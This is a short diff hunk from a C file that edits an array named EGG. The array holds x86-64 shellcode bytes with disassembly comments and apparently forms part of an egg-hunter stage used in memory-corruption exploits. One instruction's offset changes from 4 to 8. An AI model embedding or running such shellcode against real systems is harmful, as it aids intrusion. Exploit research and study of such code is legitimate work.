@@ -8,7 +8,7 @@ char EGG[] = {
   /* 0005 */ "\xb6\x10"             /* mov dh, 0x10        */
   /* 0007 */ "\x48\x01\xd7"         /* add rdi, rdx        */
   /* 000A */ "\x57"                 /* push rdi            */
-  /* 000B */ "\x48\x83\xc7\x04"     /* add rdi, 0x4        */
+  /* 000B */ "\x48\x83\xc7\x08"     /* add rdi, 0x8        */
   /* 000F */ "\x6a\x15"             /* push 0x15           */
   /* 0011 */ "\x58"                 /* pop rax             */
   /* 0012 */ "\x0f\x05"             /* syscall             */
